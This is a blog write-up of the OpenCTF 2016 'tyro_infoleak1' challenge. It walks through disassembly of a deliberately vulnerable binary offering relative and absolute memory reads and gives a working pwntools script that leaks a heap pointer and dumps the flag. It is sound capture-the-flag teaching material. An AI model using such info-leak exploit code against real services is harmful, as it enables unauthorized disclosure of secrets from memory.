---
layout: post
title: OpenCTF 2016 - Tyro Infoleak1
subtitle: 
---

This is a writeup for **tyro_infoleak1** which was the first part of a 3 part challenge involving, as the challenge name suggests, info leaks. 

{% highlight text %}
Baby's first infoleak (do you even really need the binary?) (https://en.wikipedia.org/wiki/Information_leakage)
Server: 172.31.1.36:1616
Binary: 172.31.0.10/tyro_infoleak1_bdc3f08dab986b30317b0937a096d794
{% endhighlight %}

Ignoring the challenge description, we can download the binary and run checksec on it to determine which memory protections it is compiled with.

{% highlight bash %}
$ checksec tyro_infoleak1
[*] 'openctf16/tyro_infoleak1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
{% endhighlight %}

When we run the program, we are presented with the following  

{% highlight text %}
$ ./tyro_infoleak1 
OpenCTF tyro info leak 2

ASLR is on, the binary is PIE
Can you read the flag?
1)relative read
2)absolute read
{% endhighlight %}

Basically, this program provides us with 2 functions: the ability perform a relative read, and the ability to perform an absolute read. 

## Relative Read

{% highlight text %}
.text:00000A46                 mov     dword ptr [esp], offset Offset ; "Offset: "
.text:00000A4D                 call    printf
.text:00000A52                 lea     eax, [esp+14h]
.text:00000A56                 mov     [esp+4], eax
.text:00000A5A                 mov     dword ptr [esp], offset fmtstr_x ; "%x"
.text:00000A61                 call    __isoc99_scanf  ; scanf("%x", &i);
.text:00000A66                 lea     edx, [esp+14h]
.text:00000A6A                 mov     eax, [esp+14h]
.text:00000A6E                 add     eax, edx        ; eax = &i+i
.text:00000A70                 mov     [esp+14h], eax
.text:00000A74                 mov     eax, [esp+14h]
.text:00000A78                 mov     eax, [eax]
.text:00000A7A                 mov     [esp+4], eax
.text:00000A7E                 mov     dword ptr [esp], offset fmtstr_p ; "%p\n"
.text:00000A85                 call    printf          ; printf("%p\n", *(&i+i))
.text:00000A8A                 jmp     short loc_AE5
{% endhighlight %}

All this basic block does is ask the user to specify an offset, which it uses to calculate the address located at that offset from a local variable, `i`, and prints out 4 bytes of whatever data is stored there. 


## Absolute Read

{% highlight text %}
.text:00000A8C loc_A8C:                                ; CODE XREF: main+F9j
.text:00000A8C                 mov     eax, [esp+14h]
.text:00000A90                 cmp     eax, 2
.text:00000A93                 jnz     short loc_ACD
.text:00000A95                 mov     dword ptr [esp], offset aAbsoluteAddres ; "Absolute address to read from: "
.text:00000A9C                 call    printf
.text:00000AA1                 lea     eax, [esp+14h]
.text:00000AA5                 mov     [esp+4], eax
.text:00000AA9                 mov     dword ptr [esp], offset fmtstr_x ; "%x"
.text:00000AB0                 call    __isoc99_scanf
.text:00000AB5                 mov     eax, [esp+14h]
.text:00000AB9                 mov     eax, [eax]
.text:00000ABB                 mov     [esp+4], eax
.text:00000ABF                 mov     dword ptr [esp], offset fmtstr_p ; "%p\n"
.text:00000AC6                 call    printf
.text:00000ACB                 jmp     short loc_AE5
.text:00000ACD ; ---------------------------------------------------------------------------
.text:00000ACD
.text:00000ACD loc_ACD:                                ; CODE XREF: main+148j
.text:00000ACD                 mov     dword ptr [esp], offset aWat ; "wat!"
.text:00000AD4                 call    puts
.text:00000AD9                 mov     dword ptr [esp], 0 ; status
.text:00000AE0                 call    exit
{% endhighlight %}

The Absolute Read code path simply asks the user to specify an address to read from and prints 4 bytes of whatever data is stored at the specified address.   

So, we have both a 4-byte relative infoleak primitive as well as a 4-byte absolute infoleak primitive. 

If we take a look at the preceding initialization code, we can see how we can leverage these two primitives to leak the contents of the flag.

## Initialization Flow

{% highlight text %}
.text:0000094B                 push    ebp
.text:0000094C                 mov     ebp, esp
.text:0000094E                 and     esp, 0FFFFFFF0h
.text:00000951                 sub     esp, 20h
.text:00000954                 mov     dword ptr [esp], 100h ; size
.text:0000095B                 call    malloc
.text:00000960                 mov     [esp+18h], eax
.text:00000964                 mov     dword ptr [esp], 1Eh ; seconds
.text:0000096B                 call    alarm
.text:00000970                 mov     eax, ds:stdin
.text:00000975                 mov     dword ptr [esp+4], 0 ; buf
.text:0000097D                 mov     [esp], eax      ; stream
.text:00000980                 call    setbuf
.text:00000985                 mov     eax, ds:stdout
.text:0000098A                 mov     dword ptr [esp+4], 0 ; buf
.text:00000992                 mov     [esp], eax      ; stream
.text:00000995                 call    setbuf
.text:0000099A                 mov     dword ptr [esp+4], 0 ; oflag
.text:000009A2                 mov     dword ptr [esp], offset file ; "/home/challenge/flag"
.text:000009A9                 call    open
.text:000009AE                 mov     [esp+1Ch], eax
.text:000009B2                 cmp     dword ptr [esp+1Ch], 0FFFFFFFFh
.text:000009B7                 jnz     short loc_9D1
.text:000009B9                 mov     dword ptr [esp], offset s ; "Can't open flag"
.text:000009C0                 call    puts
.text:000009C5                 mov     dword ptr [esp], 0 ; status
.text:000009CC                 call    exit
.text:000009D1 ; ---------------------------------------------------------------------------
.text:000009D1
.text:000009D1 loc_9D1:                                ; CODE XREF: main+6Cj
.text:000009D1                 mov     dword ptr [esp+8], 100h ; nbytes
.text:000009D9                 mov     eax, [esp+18h]
.text:000009DD                 mov     [esp+4], eax    ; buf
.text:000009E1                 mov     eax, [esp+1Ch]
.text:000009E5                 mov     [esp], eax      ; fd
.text:000009E8                 call    read
.text:000009ED                 mov     eax, [esp+1Ch]
.text:000009F1                 mov     [esp], eax      ; fd
.text:000009F4                 call    close
.text:000009F9                 mov     dword ptr [esp], offset aOpenctfTyroInf ; "OpenCTF tyro info leak 2\n"
.text:00000A00                 call    puts
.text:00000A05                 mov     dword ptr [esp], offset aAslrIsOnTheBin ; "ASLR is on, the binary is PIE"
.text:00000A0C                 call    puts
.text:00000A11                 mov     dword ptr [esp], offset aCanYouReadTheF ; "Can you read the flag?"
.text:00000A18                 call    puts
{% endhighlight %}

We can see that when the function is initialized, a chunk of memory is requested and allocated on the heap via `malloc(0x100)`, which is subsequently used to store the contents of the flag after calling `read()`. 

We can use our relative infoleak primitive to first, leak the address of the `malloc()`'d heap chunk, and then use our absolute infoleak primitive to leak the contents of the flag 4 bytes at a time. The following script achieves this.

## Solution 

{% highlight python %}
#!/usr/bin/env python

from pwn import *
import sys

def relative_read():
        r.sendline("1")
        r.recvuntil(": ")
        r.sendline("4")
        return int(r.recv(10),0)

def absolute_read(flag_loc):
        r.sendline("2")
        r.recvuntil(": ")
        r.sendline(str(flag_loc))
        return int(r.recvline(10),0)

def exploit(r):
        r.recvuntil("2)absolute read\n")
        flag_loc = relative_read()

        flag=""

        while(1):
                r.recvuntil("2)absolute read\n")
                try:
                        flag+=pack(absolute_read(hex(flag_loc)),32, 'big', True)
                        flag_loc+=4
                except:
                        print flag
                        break
        #r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/home/rh0gue/Documents/openctf16/tyro_infoleak1'])
        print util.proc.pidof(r)
        pause()
        exploit(r)
{% endhighlight %}
